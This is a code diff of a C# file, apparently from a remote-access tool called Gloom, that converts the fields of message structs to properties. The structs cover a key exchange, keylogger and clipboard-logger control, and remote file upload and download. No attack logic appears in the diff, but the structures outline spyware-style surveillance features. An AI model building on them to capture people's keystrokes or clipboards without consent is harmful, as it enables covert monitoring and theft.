@@ -1,6 +1,4 @@
-﻿using System.Runtime.InteropServices;
-
-namespace Gloom;
+﻿namespace Gloom;
 
 public static class OpStructs
 {
@@ -10,7 +8,7 @@ public static class OpStructs
 	{
 		public string Identifier { get; set; }
 		public byte[] ClientRandom { get; set; }
-		public byte[] DHParameter;
+		public byte[] DHParameter { get; set; }
 		public int KDFIterations { get; set; }
 		public int KDFMemorySize { get; set; }
 		public int KDFParallelism { get; set; }
@@ -31,14 +29,14 @@ public static class OpStructs
 	[Serializable]
 	public struct KeyLoggerSettingRequest
 	{
-		public int Mode;
-		public int SaveInterval;
+		public int Mode { get; set; }
+		public int SaveInterval { get; set; }
 	}
 
 	[Serializable]
 	public struct KeyLogRequest
 	{
-		public int LogCount;
+		public int LogCount { get; set; }
 	}
 
 	[Serializable]
@@ -58,13 +56,13 @@ public static class OpStructs
 	[Serializable]
 	public struct ClipboardLoggerStateResponse
 	{
-		public bool Enabled;
+		public bool Enabled { get; set; }
 	}
 
 	[Serializable]
 	public struct ClipboardLogResponse
 	{
-		public byte[] CompressedKeyLogs;
+		public byte[] CompressedKeyLogs { get; set; }
 	}
 	#endregion
 
@@ -115,9 +113,9 @@ public static class OpStructs
 	[Serializable]
 	public struct UploadFileResponse
 	{
-		public Guid Ident;
-		public int ErrorCode;
-		public byte[] Sha512Hash;
+		public Guid Ident { get; set; }
+		public int ErrorCode { get; set; }
+		public byte[] Sha512Hash { get; set; }
 	}
 
 	[Serializable]
@@ -139,18 +137,17 @@ public static class OpStructs
 	[Serializable]
 	public struct DownloadFilePreResponse
 	{
-		public Guid Ident;
-		public int ErrorCode;
-		public long TotalChunkCount;
+		public Guid Ident { get; set; }
+		public int ErrorCode { get; set; }
+		public long TotalChunkCount { get; set; }
 	}
 
 	[Serializable]
 	public struct DownloadFilePostResponse
 	{
-		public Guid Ident;
-		public int ErrorCode;
-		public long TotalChunkCount;
-		public byte[] Sha512Hash;
+		public Guid Ident { get; set; }
+		public int ErrorCode { get; set; }
+		public byte[] Sha512Hash { get; set; }
 	}
 	#endregion
 
